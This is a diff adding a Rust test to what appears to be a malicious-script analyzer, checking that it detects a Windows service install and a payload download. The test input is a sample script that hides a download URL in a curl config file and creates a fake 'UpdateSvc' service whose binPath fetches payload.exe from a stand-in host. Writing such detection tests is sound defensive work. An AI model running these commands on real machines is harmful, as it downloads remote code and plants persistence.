@@ -7939,6 +7939,40 @@ mod wmic_tests {
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod service_install_tests {
+    use crate::{analyze, Config, Trait};
+
+    #[test]
+    fn sc_create_binpath_cmd_child_is_analyzed() {
+        let script = br#"echo url = "https://sc-binpath.example/payload.exe" > curl.cfg
+sc create UpdateSvc binPath= "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("cmd.exe /c curl -K curl.cfg")
+            )),
+            "service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://sc-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "service binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod cscript_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
